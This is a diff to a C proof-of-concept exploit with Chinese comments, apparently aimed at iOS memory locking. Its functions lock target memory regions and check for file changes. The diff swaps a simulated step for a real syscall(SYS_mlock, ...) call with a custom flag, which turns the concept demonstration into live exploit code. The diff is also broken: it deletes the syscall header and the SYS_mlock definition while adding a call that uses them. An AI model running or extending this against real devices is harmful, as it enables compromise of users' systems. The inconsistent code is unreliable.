@@ -43,12 +43,6 @@
 #include <string.h>
 #include <stdbool.h>
 #include <errno.h>
-#include <sys/syscall.h>
-
-// 定义系统调用号(如果未定义)
-#ifndef SYS_mlock
-#define SYS_mlock 203  // iOS上的mlock系统调用号
-#endif
 
 // 定义常量
 #define PAGE_SIZE 4096
@@ -119,8 +113,11 @@ bool setup_special_memory_locks(void* target_addr, void* temp_addr) {
     printf("[+] 目标地址已锁定\n");
     
     // 使用自定义锁定标志 (概念性的，真实实现可能不同)
-    int result = 0; // 在概念验证中跳过实际syscall
-    printf("[*] 模拟执行特殊mlock系统调用 (概念验证)\n");
+    int result = syscall(SYS_mlock, target_addr, PAGE_SIZE, CUSTOM_MLOCK_ONFAULT);
+    if (result != 0) {
+        printf("[-] 自定义锁定操作失败: %s (预期的错误，继续执行)\n", strerror(errno));
+        // 在实际漏洞中可能仍然可以继续
+    }
     
     printf("[+] 特殊锁定序列已设置\n");
     return true;
@@ -239,7 +236,7 @@ bool verify_file_changes(const char* path, const char* expected_signature) {
 }
 
 // 清理资源
-static void cleanup_resources(void* target_addr, void* temp_addr) {
+void cleanup_resources(void* target_addr, void* temp_addr) {
     printf("[*] 清理资源\n");
     
     if (target_addr != MAP_FAILED && target_addr != NULL) {
